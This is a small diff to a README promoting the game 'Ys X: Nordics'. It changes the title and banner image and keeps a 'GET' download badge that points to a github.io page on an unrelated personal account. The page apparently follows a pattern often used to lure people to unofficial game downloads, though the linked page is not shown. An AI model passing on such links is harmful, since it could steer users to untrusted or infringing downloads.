@@ -1,6 +1,6 @@
-# Ys X: Nordics — Naval Exploration and Action RPG
+# Ys X: Nordics Deluxe Edition — Naval Exploration and Action RPG
 
-![Ys X Nordics Banner](https://m.media-amazon.com/images/M/MV5BNDRlYmNlNGQtZjcyZS00ZTliLTg0NmItMmU3NzMwZmZmODA3XkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg)
+![Ys X Nordics Banner](https://hb.imgix.net/7588f00a00a8e04dabbdd481c1002ad168fd4da5.jpg?auto=compress,format&fit=crop&h=353&w=616&s=75e23883c091b9f9bd4d83ea503fb5d6)
 
 [![GET — Ys X Nordics](https://img.shields.io/badge/GET%20%E2%80%94%20Ys%20X%20Nordics-0078D6?style=for-the-badge&logoColor=white)](https://lindaturnerr593.github.io/.github/Ys-X-Nordics-RPG)
 
